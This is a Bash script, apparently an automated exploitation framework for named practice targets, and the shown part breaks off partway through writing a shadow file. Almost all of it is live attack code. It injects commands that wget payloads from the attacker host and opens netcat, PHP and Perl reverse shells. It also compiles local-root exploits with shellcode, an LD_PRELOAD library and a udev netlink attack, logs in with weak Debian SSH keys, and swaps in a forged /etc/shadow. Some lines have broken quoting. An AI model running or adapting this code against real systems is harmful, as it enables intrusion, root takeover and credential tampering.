#
################################################################################
#~~~~~~~~~~~~~~~> Ralph CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~~#
################################################################################
#
# start ralph exploitation process
Ralph() {
  makeRalphRC() {
    if [ ! -f $msfs/ralph$toctet.rc ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $msfs/ralph$toctet.rc "
        checkthebrakesBot;
        echo -e "use $RalphExploit" > $msfs/ralph$toctet.rc
        echo -e "set password password" >> $msfs/ralph$toctet.rc
        echo -e "set rhost $uip" >> $msfs/ralph$toctet.rc
        echo -e "set lport $lp" >> $msfs/ralph$toctet.rc
        echo -e "set lhost $AttackerIP" >> $msfs/ralph$toctet.rc
        echo -e "set $DPH" >> $msfs/ralph$toctet.rc
        echo -e "exploit" >> $msfs/ralph$toctet.rc
        echo -e "exit" >> $msfs/ralph$toctet.rc
    fi;
  }
  makeRalphRC;
  ExploitRalph() {                  
    # start ralph exploitation process
    checkthebrakesTop;
    echo -e "\t[*] Starting Exploitation of Ralph "
    checkthebrakesBot;
    (makeXtermLog "Ralph-Exploitation" "$msfc -r $msfs/ralph$toctet.rc" &) >/dev/null
  }
  ExploitRalph;
  checkthebrakesTop;
  echo -e "\t[*] Finished Exploitation of Ralph "
  checkthebrakesBot;
}
#
################################################################################
#~~~~~~~~~~~~~~~> Gentoo CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~#
################################################################################
#
# start Gentoo
Gentoo() {
  # make the gentoo dirt
  CheckGentoo() {
    if [ ! -d $webdir/gentoo ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing Dir: $webdir/gentoo "
        checkthebrakesBot;
        mkdir $webdir/gentoo
    fi;
  }
  CheckGentoo;
  GenExploit() {
    if [ ! -f /$webdir/gentoo/gentooLR$toctet.c ];
      then
        # make the local root exploit
        checkthebrakesTop;
        echo -e "\t[*] Producing file: /$webdir/gentoo/gentooLR$toctet.c "
        checkthebrakesBot;
        cat /usr/share/exploitdb/platforms/linux/local/8572.c |\
          sed -r 's/\/tmp\/run/\/usr\/src\/software\/cyrus-sasl-2.1.22\/utils\/run$toctet.sh/g' > /$webdir/gentoo/gentooLR$toctet.c
        checkthebrakesTop;
        echo -e "\t[*] Compiling Gentoo Exploit file: $webdir/gentoo/gentooLR$toctet "
        checkthebrakesBot;
        gcc -w $webdir/gentoo/gentooLR$toctet.c -o $webdir/gentoo/gentooLR$toctet
    fi;
  }
  GenExploit;
  GentooAttackScript() {
    # make the run.sh file
    if [ ! -f $webdir/gentoo/run$toctet.sh ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $webdir/gentoo/run$toctet.sh "
        checkthebrakesBot;
        echo '#!/bin/bash' > $webdir/gentoo/run$toctet.sh
        echo 'nc $attackerIP 5678 -e /bin/bash' >> $webdir/gentoo/run$toctet.sh
    fi;
  }
  GentooAttackScript;
  ExploitGentoo(){
    # start the exploitation process
    checkthebrakesTop;
    echo -e "\t[*] Starting Gentoo Exploitation Stage 1 initial Wget (localroot Exploit upload)"
    checkthebrakesBot;
    (makeXtermLog "Gentoo-wget-localr00t" "wget "http://$uip:10443/foo.pl?\`wget http://$AttackerIP/gentoo/gentooLR$toctet \
        -O /usr/src/software/cyrus-sasl-2.1.22/utils/gentooLR$toctet%26\`" &) >/dev/null
    checkthebrakesTop;
    echo -e "\t[*] Starting Gentoo Exploitation Stage 2 Secondary Wget (Bash Script upload)"
    checkthebrakesBot;
    (makeXtermLog "Gentoo-wget-shellscript" "wget "http://$uip:10443/foo.pl?\`wget http://$AttackerIP/gentoo/run$toctet.sh \
        -O /usr/src/software/cyrus-sasl-2.1.22/utils/run$toctet.sh%26\`" &) >/dev/null 
    checkthebrakesTop;
    echo -e "\t[*] Starting Gentoo Exploitation Stage 3 Tritary Wget (chmod of localroot binary)"
    checkthebrakesBot;
    (makeXtermLog "Gentoo-chmod-Exploit" "wget "http://$uip:10443/foo.pl?\`chmod 755 /usr/src/software/cyrus-sasl-2.1.22/utils/gentooLR$toctet%26\`" &) >/dev/null
    checkthebrakesTop;
    echo -e "\t[*] Starting Gentoo Exploitation Stage 4 (Start local NetCat Listener)"
    checkthebrakesBot;
    (makeXtermLog "Gentoo-open-NC-Listener" "nc -lvp 5678 &) >/dev/null
    sleep 10
    # From exploit used on Gentoo, you need to send the PID as a parameter
    # err = "Pass the udevd netlink PID as an argument"
    # In this case the PID is 9245
    checkthebrakesTop;
    echo -e "\t[*] Starting Gentoo Exploitation Stage 5 (Launch Gentoo localroot exploit)"
    checkthebrakesBot;
    (makeXtermLog "Gentoo-Launch-Local-Exploit" "wget "http://$uip:10443/foo.pl?\`/usr/src/software/cyrus-sasl-2.1.22/utils/gentooLR$toctet 9245%26\`" &) >/dev/null
    rm ./foo.pl*
  }
  ExploitGentoo;
  checkthebrakesTop;
  echo -e "\t[*] Finished Gentoo Exploitation"
  checkthebrakesBot;
}
#
################################################################################
#~~~~~~~~~~~~~~~~> PAIN CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~~#
################################################################################
#
# start Gentoo
Pain() {
  checkExpect() {
    # check if expect is installed
    checkthebrakesTop
    echo -e "\t[*] Updating DB for files and binaries (updatedb), Please wait ....."
    checkthebrakesBot
    updatedb >/dev/null
    echo -e "~~~~~~~~~~~~~~~~> Finished Updating DB ....."
    if [ "`which expect | grep "/usr/bin/" | head -n1 | cut -d"/" -f4`" != "expect" ];
      then
        checkthebrakesTop
        echo -e "\t[*] Non expect found - Installing from Apt Repo, please wait ....."
        checkthebrakesBot
        apt-get update >/dev/null
        apt-get -y install expect >/dev/null
        checkthebrakesTop
        echo -e "\t[*] Finished installing Expect"
        checkthebrakesBot
      else
        checkthebrakesTop
        echo -e "\t[*] Updating DB for files and binaries (updatedb), Please wait ....."
        checkthebrakesBot
        updatedb >/dev/null
        checkthebrakesTop
        echo -e "\t[*] Finished updating locate DB"
        checkthebrakesBot    fi;
  }
  checkExpect;
  makePainDir() {
    # make the pain dir structure
    if [ ! -d $webdir/pain ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing Dir: $webdir/pain "
        checkthebrakesBot;
        mkdir $webdir/pain
    fi;
  }
  makePainDir;
  checkMonkey;
  makePainShell() {
    # make reverse shell based on subnets
    if [ ! -f $webdir/pain/pain$toctet.txt ];
      then
        checkthebrakesTop
        echo -e "\t[*] Producing file: $webdir/pain/pain$toctet.txt"
        checkthebrakesBot
        cat /var/www/pain/php-reverse-shell-1.0/php-reverse-shell.php |\ 
        sed -r "s/ip \= '127.0.0.1'/ip \= '$AttackerIP'/g" |\
        sed -r "s/port = 1234/port = 5432/g" > $webdir/pain/pain$toctet.txt
    fi;
  }
  makePainShell;
  makePainUDEV() {
    if [ ! -f $webdir/pain/udev$toctet.c ];
      then
        checkthebrakesTop
        echo -e "\t[*] Producing file: $webdir/pain/udev$toctet.c"
        checkthebrakesBot
        echo -e "#include <fcntl.h>" > $webdir/pain/udev$toctet.c
        echo -e "#include <stdio.h>" >> $webdir/pain/udev$toctet.c
        echo -e "#include <string.h>" >> $webdir/pain/udev$toctet.c
        echo -e "#include <stdlib.h>" >> $webdir/pain/udev$toctet.c
        echo -e "#include <unistd.h>" >> $webdir/pain/udev$toctet.c
        echo -e "#include <dirent.h>" >> $webdir/pain/udev$toctet.c
        echo -e "#include <sys/stat.h>" >> $webdir/pain/udev$toctet.c
        echo -e "#include <sysexits.h>" >> $webdir/pain/udev$toctet.c
        echo -e "#include <wait.h>" >> $webdir/pain/udev$toctet.c
        echo -e "#include <signal.h>" >> $webdir/pain/udev$toctet.c
        echo -e "#include <sys/socket.h>" >> $webdir/pain/udev$toctet.c
        echo -e "#include <linux/types.h>" >> $webdir/pain/udev$toctet.c
        echo -e "#include <linux/netlink.h>" >> $webdir/pain/udev$toctet.c
        echo -e "#ifndef NETLINK_KOBJECT_UEVENT" >> $webdir/pain/udev$toctet.c
        echo -e "#define NETLINK_KOBJECT_UEVENT 15" >> $webdir/pain/udev$toctet.c
        echo -e "#endif" >> $webdir/pain/udev$toctet.c
        echo -e "#define SHORT_STRING 64" >> $webdir/pain/udev$toctet.c
        echo -e "#define MEDIUM_STRING 128" >> $webdir/pain/udev$toctet.c
        echo -e "#define BIG_STRING 256" >> $webdir/pain/udev$toctet.c
        echo -e "#define LONG_STRING 1024" >> $webdir/pain/udev$toctet.c
        echo -e "#define EXTRALONG_STRING 4096" >> $webdir/pain/udev$toctet.c
        echo -e "#define TRUE 1" >> $webdir/pain/udev$toctet.c
        echo -e "#define FALSE 0" >> $webdir/pain/udev$toctet.c
        echo -e "int socket_fd;" >> $webdir/pain/udev$toctet.c
        echo -e 'struct sockaddr_nl address;' >> $webdir/pain/udev$toctet.c
        echo -e 'struct msghdr msg;' >> $webdir/pain/udev$toctet.c
        echo -e "struct iovec iovector;" >> $webdir/pain/udev$toctet.c
        echo -e 'int sz = 64*1024;' >> $webdir/pain/udev$toctet.c
        echo -e "main(int argc, char **argv) {" >> $webdir/pain/udev$toctet.c
        echo -e '\tchar sysfspath[SHORT_STRING];' >> $webdir/pain/udev$toctet.c
        echo -e "\tchar subsystem[SHORT_STRING];" >> $webdir/pain/udev$toctet.c
        echo -e "\tchar event[SHORT_STRING];" >> $webdir/pain/udev$toctet.c
        echo -e "\tchar major[SHORT_STRING];" >> $webdir/pain/udev$toctet.c
        echo -e "\tchar minor[SHORT_STRING];" >> $webdir/pain/udev$toctet.c
        echo -e '\tsprintf(event, "add");' >> $webdir/pain/udev$toctet.c
        echo -e '\tsprintf(subsystem, "block");' >> $webdir/pain/udev$toctet.c
        echo -e '\tsprintf(sysfspath, "/dev/foo");' >> $webdir/pain/udev$toctet.c
        echo -e '\tsprintf(major, "8");' >> $webdir/pain/udev$toctet.c
        echo -e '\tsprintf(minor, "1");' >> $webdir/pain/udev$toctet.c
        echo -e '\tmemset(&address, 0, sizeof(address));' >> $webdir/pain/udev$toctet.c
        echo -e '\taddress.nl_family = AF_NETLINK;' >> $webdir/pain/udev$toctet.c
        echo -e '\taddress.nl_pid = atoi(argv[1]);' >> $webdir/pain/udev$toctet.c
        echo -e '\taddress.nl_groups = 0;' >> $webdir/pain/udev$toctet.c
        echo -e "\tmsg.msg_name = (void*)&address;" >> $webdir/pain/udev$toctet.c
        echo -e '\tmsg.msg_namelen = sizeof(address);' >> $webdir/pain/udev$toctet.c
        echo -e '\tmsg.msg_iov = &iovector;' >> $webdir/pain/udev$toctet.c
        echo -e "\tmsg.msg_iovlen = 1;" >> $webdir/pain/udev$toctet.c
        echo -e "\tsocket_fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);" >> $webdir/pain/udev$toctet.c
        echo -e "\tbind(socket_fd, (struct sockaddr *) &address, sizeof(address));" >> $webdir/pain/udev$toctet.c
        echo -e '\tchar message[LONG_STRING];' >> $webdir/pain/udev$toctet.c
        echo -e '\tchar *mp;' >> $webdir/pain/udev$toctet.c
        echo -e '\tmp = message;' >> $webdir/pain/udev$toctet.c
        echo -e '\tmp += sprintf(mp, "%s@%s", event, sysfspath) +1;' >> $webdir/pain/udev$toctet.c
        echo -e '\tmp += sprintf(mp, "ACTION=%s", event) +1;' >> $webdir/pain/udev$toctet.c
        echo -e '\tmp += sprintf(mp, "DEVPATH=%s", sysfspath) +1;' >> $webdir/pain/udev$toctet.c
        echo -e '\tmp += sprintf(mp, "MAJOR=%s", major) +1;' >> $webdir/pain/udev$toctet.c
        echo -e '\tmp += sprintf(mp, "MINOR=%s", minor) +1;' >> $webdir/pain/udev$toctet.c
        echo -e '\tmp += sprintf(mp, "SUBSYSTEM=%s", subsystem) +1;' >> $webdir/pain/udev$toctet.c
        echo -e '\tmp += sprintf(mp, "LD_PRELOAD=/tmp/libno_ex.so.1.0") +1;' >> $webdir/pain/udev$toctet.c
        echo -e '\tiovector.iov_base = (void*)message;' >> $webdir/pain/udev$toctet.c
        echo -e '\tiovector.iov_len = (int)(mp-message);' >> $webdir/pain/udev$toctet.c
        echo -e '\tchar *buf;' >> $webdir/pain/udev$toctet.c
        echo -e '\tint buflen;' >> $webdir/pain/udev$toctet.c
        echo -e '\tbuf = (char *) &msg;' >> $webdir/pain/udev$toctet.c
        echo -e '\tbuflen = (int)(mp-message);' >> $webdir/pain/udev$toctet.c
        echo -e '\tsendmsg(socket_fd, &msg, 0);' >> $webdir/pain/udev$toctet.c
        echo -e '\tclose(socket_fd);' >> $webdir/pain/udev$toctet.c
        echo -e '\tsleep(10);' >> $webdir/pain/udev$toctet.c
        echo -e '\texecl("/tmp/suid", "suid", (void*)0);' >> $webdir/pain/udev$toctet.c
        echo -e '}' >> $webdir/pain/udev$toctet.c
        gcc $webdir/pain/udev$toctet.c -o $webdir/pain/udev$toctet 2>/dev/null
      fi;
    }
    makePainUDEV;
    makePainlibno() {
      # make libno_ex.so.1.0
      if [ ! -f $webdir/pain/program$toctet.c ];
        then
          checkthebrakesTop
          echo -e "\t[*] Producing file: $webdir/pain/program$toctet.c"
          checkthebrakesBot
          echo -e '#include <unistd.h>' > $webdir/pain/program$toctet.c
          echo -e '#include <stdio.h>' >> $webdir/pain/program$toctet.c
          echo -e '#include <sys/types.h>' >> $webdir/pain/program$toctet.c
          echo -e '#include <stdlib.h>' >> $webdir/pain/program$toctet.c
          echo -e 'void _init()' >> $webdir/pain/program$toctet.c
          echo -e '{' >> $webdir/pain/program$toctet.c
          echo -e ' setgid(0);' >> $webdir/pain/program$toctet.c
          echo -e ' setuid(0);' >> $webdir/pain/program$toctet.c
          echo -e ' unsetenv("LD_PRELOAD");' >> $webdir/pain/program$toctet.c
          echo -e ' execl("/bin/sh","sh","-c","chown root:root /tmp/suid; chmod +s /tmp/suid",NULL);' >> $webdir/pain/program$toctet.c
          echo -e '}' >> $webdir/pain/program$toctet.c
          gcc -o $webdir/pain/program$toctet.o -c $webdir/pain/program$toctet.c -fPIC
          gcc -shared -Wl,-soname,libno_ex.so.1 -o $webdir/pain/libno_ex.so.1.0 $webdir/pain/program$toctet.o -nostartfiles                    
      fi
    }
    makePainlibno;
    makePainSUID() {
      # make suid
      if [ ! -f $webdir/pain/suid$toctet.c ];
        then
          checkthebrakesTop
          echo -e "\t[*] Producing file: $webdir/pain/suid$toctet.c"
          checkthebrakesBot
          echo -e '#include <stdio.h>' > $webdir/pain/suid$toctet.c
          echo -e 'char shellcode[] =' >> $webdir/pain/suid$toctet.c
          echo -e '"\\x31\\xc9\\x89\\xcb\\x6a\\x46\\x58\\xcd\\x80\\x6a\\x05\\x58\\x31\\xc9\\x51"' >> $webdir/pain/suid$toctet.c
          echo -e '"\\x68\\x73\\x73\\x77\\x64\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74\\x63"' >> $webdir/pain/suid$toctet.c
          echo -e '"\\x89\\xe3\\x41\\xb5\\x04\\xcd\\x80\\x93\\xe8\\x21\\x00\\x00\\x00\\x73\\x75"' >> $webdir/pain/suid$toctet.c
          echo -e '"\\x62\\x3a\\x41\\x7a\\x67\\x7a\\x4c\\x35\\x50\\x4a\\x4a\\x64\\x77\\x73\\x36"' >> $webdir/pain/suid$toctet.c
          echo -e '"\\x3a\\x30\\x3a\\x30\\x3a\\x3a\\x2f\\x3a\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68"' >> $webdir/pain/suid$toctet.c
          echo -e '"\\x0a\\x59\\x8b\\x51\\xfc\\x6a\\x04\\x58\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80";' >> $webdir/pain/suid$toctet.c
          echo -e 'int main(void)' >> $webdir/pain/suid$toctet.c
          echo -e '{' >> $webdir/pain/suid$toctet.c
          echo -e '\tfprintf(stdout,"[*] Shellcode length: %d\\n",strlen(shellcode)); >> $webdir/pain/suid$toctet.c
          echo -e '\t((void(*)(void)) shellcode)();' >> $webdir/pain/suid$toctet.c
          echo -e '\treturn 0;' >> $webdir/pain/suid$toctet.c
          echo -e '}' >> $webdir/pain/suid$toctet.c
          checkthebrakesTop
          echo -e "\t[*] Compiling: $webdir/pain/suid$toctet.c"
          checkthebrakesBot
          gcc -o $webdir/pain/suid$toctet -w $webdir/pain/suid$toctet.c
      fi;
    makePainSUID;
    stopthePain() {
      # stop php on apache 
      if [ "`netstat -antelop | grep "apache2" | tr -s " " | cut -d " " -f6`" == "LISTEN" ]; 
        then
           checkthebrakesTop
           echo -e "\t[*] Stopping Apache / Disabling PHP7.0 / Re-Enable Apache"
           checkthebrakesBot
           systemctl stop apache2
           a2dismod php7.0
           systemctl start apache2
        else
           checkthebrakesTop
           echo -e "\t[*] Disabling PHP7.0 / Re-Enable Apache"
           checkthebrakesBot
           a2dismod php7.0
           systemctl start apache2
      fi;
    }
    stopthePain;
    PainExploitation() {
      # start exploitation for pain
      checkthebrakesTop
      echo -e "\t[*] Starting Pain Exploitation Stage 1 (Loaded Netcat Listener)"
      checkthebrakesBot
      (makextermLog "Pain_Exploitation_Stage_1" "echo -e 'wget http://$AttackerIP/pain/udev$toctet -O /tmp/udev && \
            wget http://$AttackerIP/pain/suid -O /tmp/suid && \
            wget http://$AttackerIP/pain/libno_ex.so.1.0 -O /tmp/libno_ex.so.1.0 && \
            chmod 777 /tmp/udev && \
            chmod 777 /tmp/suid && \
            chmod 777 /tmp/libno_ex.so.1.0 && \
            /tmp/udev 398' | nc -lvp 5432" &) >/dev/null
      checkthebrakesTop
      echo -e "\t[*] Starting Pain Exploitation Stage 2 (Initial Attack)"
      checkthebrakesBot
      (makeXtermLog "Pain_Exploitation_Stage_2" "wget http://$uid/section.php?page=http://$AttackerIP/pain/pain$toctet.txt?" &) >/dev/null
      rm -rf ./section*"
      checkthebrakesTop
      echo -e "\t[*] Starting Pain Exploitation Stage 3 (Establish SSH Connection)"
      checkthebrakesBot
      (makeXtermLog "Pain_Exploitation_Stage_3" "sleep 90 && \
          expect -c 'spawn ssh -o StrictHostKeyChecking=no USER@$uip
          sleep 60
          expect password
          send \"bus\n\"
          interact'" &) >/dev/null
      sleep 40
      checkthebrakesTop
      echo -e "\t[*] Cleaning up from Pain Exploitation"
      checkthebrakesBot
      (makeXtermLog "Pain_Exploitation_Stage_4" "ps -A xf |\
         grep "section.php" |\
         grep -v "grep" |\
         grep "xterm" |\
         cut -d" " -f1 |\
         xargs kill -9 && \
         ps -A xf |\
         grep "\/tmp\/udev" |\
         grep -v "grep" |\
         grep "xterm" |\
         cut -d" " -f1 |\
         xargs kill -9' &) >/dev/null
  }
  PainExploitation;
  renableServices() {
    checkthebrakesTop
    echo -e "\t[*] Re-Enabling system services prior to Pain Exploitation"
    checkthebrakesBot
    systemctl stop apache2
    sleep 1
    a2enmod php7.0
    sleep 1
    systemctl start apache2
  }
  renableServices;
  checkthebrakesTop
  echo -e "\t[*] Finished Pain Exploitation"
  checkthebrakesBot
}
#
################################################################################
#~~~~~~~~~~~~~~~> Suffer CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~#
################################################################################
#
# start Suffer
sufferMore() {
# check if expect is installed
  checkExpect() {
    # check if expect is installed
    checkthebrakesTop
    echo -e "\t[*] Updating DB for files and binaries (updatedb), Please wait ....."
    checkthebrakesBot
    updatedb >/dev/null
    checkthebrakesTop
    echo -e "\t[*] Finished updating locate DB"
    checkthebrakesBot
    if [ "`which expect | grep "/usr/bin/" | head -n1 | cut -d"/" -f4`" != "expect" ];
      then
        checkthebrakesTop
        echo -e "\t[*] Non expect found - Installing from Apt Repo, please wait ....."
        checkthebrakesBot
        apt-get update >/dev/null
        apt-get -y install expect >/dev/null
        checkthebrakesTop
        echo -e "\t[*] Finished install 'expect' from Apt Repo"
        checkthebrakesBot
      else
        checkthebrakesTop
        echo -e "\t[*] Updating DB for files and binaries (updatedb), Please wait ....."
        checkthebrakesBot
        updatedb >/dev/null
        checkthebrakesTop
        echo -e "\t[*] Finished updating locate DB"
        checkthebrakesBot
    fi;
  }
  checkExpect;
  makeSufferDir() {
    # make the sufference dir structure                                               
    if [ ! -d $webdir/suffer ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing Dir: $webdir/suffer "
        checkthebrakesBot;
        mkdir $webdir/suffer
    fi;
  }
  makeSufferDir;
  sufferDSA() {                     
    # get the dsa 1024 files and make the dir as needed to ssh ans scp
    if [ ! -d $webdir/suffer/dsa ];
      then                           
        checkthebrakesTop;
        echo -e "\t[*] Downloading DSA files to: $webdir/suffer/ "
        checkthebrakesBot;
        wget digitaloffense.net/tools/debian-openssl/debian_ssh_dsa_1024_x86.tar.bz2 \
            -O $webdir/suffer/debian_ssh_dsa_1024_x86.tar.bz2
        checkthebrakesTop;
        echo -e "\t[*] Expanding Debian SSH DSA Keys to: $webdir/suffer/dsa/ "
        checkthebrakesBot;
        tar -jxvf $webdir/suffer/debian_ssh_dsa_1024_x86.tar.bz2
    fi;
  }
  sufferDSA;
  makeSufferShell() {
    # make the local root shellcode
    if [ ! -f $webdir/suffer/suf$toctet.c ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $webdir/suffer/suf$toctet.c "
        checkthebrakesBot;
        echo -e '#include <stdio.h>' > $webdir/suffer/suf$toctet.c
        echo -e 'char shellcode[] =' >> $webdir/suffer/suf$toctet.c
        echo -e '"\\x31\\xc9\\x89\\xcb\\x6a\\x46\\x58\\xcd\\x80\\x6a\\x05\\x58\\x31\\xc9\\x51"' >> $webdir/suffer/suf$toctet.c
        echo -e '"\\x68\\x73\\x73\\x77\\x64\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74\\x63"' >> $webdir/suffer/suf$toctet.c
        echo -e '"\\x89\\xe3\\x41\\xb5\\x04\\xcd\\x80\\x93\\xe8\\x21\\x00\\x00\\x00\\x73\\x75"' >> $webdir/suffer/suf$toctet.c
        echo -e '"\\x62\\x3a\\x41\\x7a\\x67\\x7a\\x4c\\x35\\x50\\x4a\\x4a\\x64\\x77\\x73\\x36"' >> $webdir/suffer/suf$toctet.c
        echo -e '"\\x3a\\x30\\x3a\\x30\\x3a\\x3a\\x2f\\x3a\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68"' >> $webdir/suffer/suf$toctet.c
        echo -e '"\\x0a\\x59\\x8b\\x51\\xfc\\x6a\\x04\\x58\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80";' >> $webdir/suffer/suf$toctet.c
        echo -e 'int main(void)' >> $webdir/suffer/suf$toctet.c
        echo -e '{' >> $webdir/suffer/suf$toctet.c
        echo -e '\tfprintf(stdout,"[*] Shellcode length: %d\\n",strlen(shellcode));' >> $webdir/suffer/suf$toctet.c
        echo -e '\t((void(*)(void)) shellcode)();' >> $webdir/suffer/suf$toctet.c
        echo -e '\treturn 0;' >> $webdir/suffer/suf$toctet.c
        echo -e '}' >> $webdir/suffer/suf$toctet.c
        checkthebrakesTop;
        echo -e "\t[*] Compiling file: $webdir/suffer/suf$toctet.c "
        checkthebrakesBot;
        gcc -w $webdir/suffer/suf$toctet.c -o $webdir/suffer/scp$toctet
    fi;
  }
  makeSufferShell;
  makeSufferHelper() {
    # make the helper script
    if [ ! -f $webdir/suffer/helper$toctet.sh ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $webdir/suffer/helper$toctet.sh "
        checkthebrakesBot;
        echo -e '#!/bin/bash'' > $webdir/suffer/helper$toctet.sh
        echo -e 'chmod 777 ./scp' >> $webdir/suffer/helper$toctet.sh
        echo -e 'export PATH=/home/bob:$PATH\nuploadtosecure' >> $webdir/suffer/helper$toctet.sh
    fi;
  }
  makeSufferHelper;
  ExploitSuffer() {
    # start the exploitation process
    checkthebrakesTop;
    echo -e "\t[*] Starting Suffer Exploitation Stage 1 (SSH upload scp$toctet)"
    checkthebrakesBot;
    (makeXtermLog "Suffer_Exploitation_Stage_1" "scp -o StrictHostKeyChecking=no \
        -i $webdir/suffer/dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858 \
        $webdir/suffer/scp$toctet bob@$uip:~/" &) >/dev/null
    sleep 3
    checkthebrakesTop;
    echo -e "\t[*] Starting Suffer Exploitation Stage 2 (SSH upload helper$toctet.sh)"
    checkthebrakesBot;
    (makeXtermLog "Suffer_Exploitation_Stage_2" "scp -o StrictHostKeyChecking=no \
        -i $webdir/suffer/dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858 \
        $webdir/suffer/helper$toctet.sh bob@$uip:~/" &) >/dev/null
    sleep 3
    checkthebrakesTop;
    echo -e "\t[*] Starting Suffer Exploitation Stage 3 (SSH chmod of helper$toctet.sh)"
    checkthebrakesBot;
    (makeXtermLog "Suffer_Exploitation_Stage_3" "ssh -o StrictHostKeyChecking=no \
        -i $webdir/suffer/dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858 \
        -l bob $uip chmod 777 ./helper$toctet.sh" &) >/dev/null
    sleep 3
    checkthebrakesTop;
    echo -e "\t[*] Starting Suffer Exploitation Stage 4 (SSH execution of helper$toctet.sh)"
    checkthebrakesBot;
    (makeXtermLog "Suffer_Exploitation_Stage_4" "ssh -o StrictHostKeyChecking=no \
        -i $webdir/suffer/dsa/1024/f1fb2162a02f0f7c40c210e6167f05ca-16858 \
        -l bob $uip ./helper$toctet.sh" &) >/dev/null
    sleep 3
    checkthebrakesTop;
    echo -e "\t[*] Starting Suffer Exploitation Stage 5 (SSH Connection Attemp with DSA)"
    checkthebrakesBot;
    (makeXtermLog "Suffer_Exploitation_Stage_5" "expect -c \
        'spawn ssh -o StrictHostKeyChecking=no USER@$uip ; \
        expect password ; \
        send "bus\n" ; \
        interact' &) >/dev/null
   }
   ExploitSuffer;
   checkthebrakesTop;
   echo -e "\t[*] Finished Suffer Exploitation"
   checkthebrakesBot;
}
#
################################################################################
#~~~~~~~~~~~~~~~~> FC4ME CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~#
################################################################################
#
# start FC4ME1
fc4me() {
  fc4webdir() {
    # fc4 dir structure
    if [ ! -d $webdir/fc4 ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing Dir: $webdir/fc4 "
        checkthebrakesBot;
        mkdir $webdir/fc4
    fi;
  }
  fc4webdir;
  fc4perlshell() {
    # fc4 perl reverse shell
    if [ ! -f $webdir/fc4/perl-reverse-shell-1.0.tar.gz ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Downloading Pentest Money Perl Shell "
        checkthebrakesBot;
        wget http://pentestmonkey.net/tools/perl-reverse-shell/perl-reverse-shell-1.0.tar.gz -O $webdir/fc4/perl-reverse-shell-1.0.tar.gz
        cd $webdir/fc4/;
        checkthebrakesTop;
        echo -e "\t[*] Expanding $webdir/fc4/perl-reverse-shell-1.0.tar.gz"
        checkthebrakesBot;
        tar -zxvf perl-reverse-shell-1.0.tar.gz
        cd ~
    fi;
  }
  fc4perlshell;
  fc4perl2cgi() {
    # fc4 perl to cgi shell file for testing
    if [ ! -f $webdir/fc4/fc4$toctet.cgi ];
      then
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $webdir/fc4/fc4$toctet.cgi "
        checkthebrakesBot;
        cat $webdir/fc4/perl-reverse-shell-1.0/perl-reverse-shell.pl |\
          sed -r "s/ip \= '127.0.0.1'\;/ip \= '$AttackerIP'\;/g" |\
          sed -r "s/port \= 1234\;/port \= 4321\;/g" > $webdir/fc4/fc4$toctet.cgi
    fi;
  }
  fc4perl2cgi;
  fc4evilcgi() {
    # make the evil.cgi
    if [ ! -f $webdir/fc4/evil$toctet.cgi ];
      then 
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $webdir/fc4/evil$toctet.cgi "
        checkthebrakesBot;
        echo -e '#!/usr/bin/perl' > $webdir/fc4/evil$toctet.cgi
        echo -e 'use File::Copy;' >> $webdir/fc4/evil$toctet.cgi
        echo -e '$oldlocation = "/etc/shadow-";' >> $webdir/fc4/evil$toctet.cgi
        echo -e '$newlocation = "/etc/shadow-.old";' >> $webdir/fc4/evil$toctet.cgi
        echo -e 'move($oldlocation, $newlocation);' >> $webdir/fc4/evil$toctet.cgi
        echo -e '$oldlocation = "/etc/shadow";' >> $webdir/fc4/evil$toctet.cgi
        echo -e '$newlocation = "/etc/shadow.old";' >> $webdir/fc4/evil$toctet.cgi
        echo -e 'move($oldlocation, $newlocation);' >> $webdir/fc4/evil$toctet.cgi
        echo -e '$evilshadows = "/home/alice/shadow";' >> $webdir/fc4/evil$toctet.cgi
        echo -e 'move($evilshadows, $oldlocation);' >> $webdir/fc4/evil$toctet.cgi
    fi;
  }
  fc4evilcgi;
  fc4evilShadow() {
    # make evil/shadow file
    if [ ! -f $webdir/fc4/evil$toctet.shadow ]; 
      then 
        checkthebrakesTop;
        echo -e "\t[*] Producing file: $webdir/fc4/evil$toctet.shadow "
        checkthebrakesBot;
        echo -e 'root:$1$8UpmX7yC$Fytsj3S1Thy/PbliY7Cfj1:14680:0:99999:7:::' > $webdir/fc4/evil$toctet.shadow
        echo -e 'bin:*:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'daemon:*:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'adm:*:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'lp:*:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'sync:*:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'shutdown:*:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'halt:*:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'mail:*:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
        echo -e 'news:*:13653:0:99999:7:::' >> $webdir/fc4/evil$toctet.shadow
